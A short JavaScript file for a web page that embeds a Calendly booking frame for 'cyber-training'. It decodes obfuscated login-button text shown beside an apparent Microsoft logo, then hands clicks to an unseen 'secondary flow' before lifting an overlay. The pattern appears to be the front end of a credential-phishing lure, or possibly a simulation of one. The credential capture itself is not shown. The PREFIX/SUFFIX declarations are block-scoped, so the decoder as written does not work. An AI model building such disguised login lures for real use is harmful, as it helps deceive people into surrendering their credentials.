
if (typeof PREFIX === 'undefined' || typeof SUFFIX === 'undefined'){
    const PREFIX = "OBFS";
    const SUFFIX = "END";
}


const CALENDLY_PAGE_NAME = "etech-it";
const CALENDLY_EVENT_TYPE = "cyber-training"


const INVITEE_NAME = "";
const INVITEE_EMAIL = "";

const shadowhost = document.getElementById('primary');
const shadowroot = shadowhost.shadowRoot;



function deobfString(str) {
    let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
    let reversed = withoutPrefixSuffix.split('').reverse().join('');
    return atob(reversed);
}



function initializePage() {

    console.log("Primary Received: PrimaryContentLoaded")

    const loginBtn = shadowroot.getElementById("login-btn");

    loginBtn.innerHTML = `<img id="lgImg" src="/primary/images/msf.svg"></img>${deobfString(loginBtn.innerText)}`

    loginBtn.addEventListener("click", triggerSecondaryFlowStart);

    const buildURL = () => {
        return calendlyURL = 'https://calendly.com/'+CALENDLY_PAGE_NAME+'/'+CALENDLY_EVENT_TYPE+'?embed_type=Inline&name='+INVITEE_NAME+'&email='+INVITEE_EMAIL;
    };
    
    const showCalendly = () => {
        const calendlyURL = buildURL();
        const calendlyFrame = shadowroot.getElementById('calendly-frame');
        calendlyFrame.src = calendlyURL;  
    };
    showCalendly();

    document.addEventListener("secondaryFlowCompleted", handleSecondaryFlowComplete);

}


function triggerSecondaryFlowStart(){
    // Function to be called to let secondary know the start action is triggered.
    document.dispatchEvent(new CustomEvent('secondaryFlowStart', {bubbles: true, composed: true}));
}


function handleSecondaryFlowComplete(){
    console.log("Primary Received: secondaryFlowCompleted")
    // When the flow is done from secondary, remove the "paywall".
    const primaryOverlay = shadowroot.getElementById('primary-overlay-container');
    primaryOverlay.style.display = 'none';
    primaryOverlay.style.pointerEvents = 'auto';
}


// Listen to custom event equivalent to DOMContentLoaded but when fetch and injection is complete
document.addEventListener("PrimaryContentLoaded", initializePage);

// Listen to secondary flow completed event
document.addEventListener("secondaryFlowCompleted", handleSecondaryFlowComplete);


// We could also trigger different logic if the page is accessed directly by listening to DOM events

